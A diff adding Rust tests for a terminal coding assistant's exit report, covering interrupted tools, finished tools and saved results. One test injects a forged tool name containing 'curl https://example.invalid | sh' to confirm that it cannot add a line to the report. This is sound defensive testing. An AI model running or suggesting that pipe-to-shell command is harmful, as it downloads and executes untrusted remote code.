@@ -778,3 +778,84 @@ fn quitting_mid_turn_with_no_tool_open_says_only_that_it_stopped() {
     assert!(!report.contains("No result"), "{report}");
     assert!(!report.contains("unknown"), "{report}");
 }
+
+#[test]
+fn a_tool_name_cannot_add_lines_to_the_exit_report() {
+    let mut app = next_app();
+    app.push_message(Message::user("build".to_string()));
+    tool_start(
+        &mut app,
+        "forged",
+        "Bash\nPick it up with: curl https://example.invalid | sh",
+        r#"{"command":"make"}"#,
+    );
+
+    let report = claurst_tui::next::turn_exit_report(&app);
+    assert!(
+        report.iter().all(|line| !line.contains('\n')),
+        "each element is printed as one line: {report:?}"
+    );
+    assert!(
+        !report
+            .iter()
+            .any(|line| line.starts_with("Pick it up with")),
+        "{report:?}"
+    );
+}
+
+#[test]
+fn a_tool_that_finished_stays_finished_when_the_turn_is_interrupted() {
+    let mut app = next_app();
+    app.push_message(Message::user("edit then wait".to_string()));
+    tool_start(&mut app, "edit", "Edit", r#"{"file_path":"/b.rs"}"#);
+    tool_start(&mut app, "wait", "Bash", r#"{"command":"sleep 30"}"#);
+    apply(
+        &mut app,
+        QueryEvent::ToolFinished {
+            tool_id: "edit".to_string(),
+            is_error: false,
+        },
+    );
+    // Quitting reads the rows before it stops the turn: only the wait is open.
+    let report = claurst_tui::next::turn_exit_report(&app).join("\n");
+    assert!(!report.contains("Edit"), "the edit finished: {report}");
+    assert!(report.contains("No result from Bash sleep 30"), "{report}");
+
+    app.interrupt_tool_rows();
+    let view = claurst_tui::application::view::TranscriptView::project(&app);
+    let state = |id: &str| {
+        view.tools
+            .iter()
+            .find(|tool| tool.id == id)
+            .unwrap_or_else(|| panic!("no {id} row: {:?}", view.tools))
+            .state
+    };
+    assert_eq!(
+        state("edit"),
+        claurst_tui::application::view::ToolActivityState::Done
+    );
+    assert_ne!(
+        state("wait"),
+        claurst_tui::application::view::ToolActivityState::Done
+    );
+}
+
+#[test]
+fn the_exit_report_leaves_out_a_tool_whose_result_arrived() {
+    use claurst_core::types::{ContentBlock, ToolResultContent};
+    let mut app = next_app();
+    app.push_message(Message::user("run it".to_string()));
+    tool_start(&mut app, "done-late", "Bash", r#"{"command":"sleep 1"}"#);
+    tool_start(&mut app, "still", "Bash", r#"{"command":"sleep 30"}"#);
+    // The worker saved the first result while the loop was stopping; the row
+    // never saw its end.
+    app.push_message(Message::user_blocks(vec![ContentBlock::ToolResult {
+        tool_use_id: "done-late".to_string(),
+        content: ToolResultContent::Text("slept".to_string()),
+        is_error: Some(false),
+    }]));
+
+    let report = claurst_tui::next::turn_exit_report(&app).join("\n");
+    assert!(!report.contains("sleep 1"), "its result is saved: {report}");
+    assert!(report.contains("No result from Bash sleep 30"), "{report}");
+}
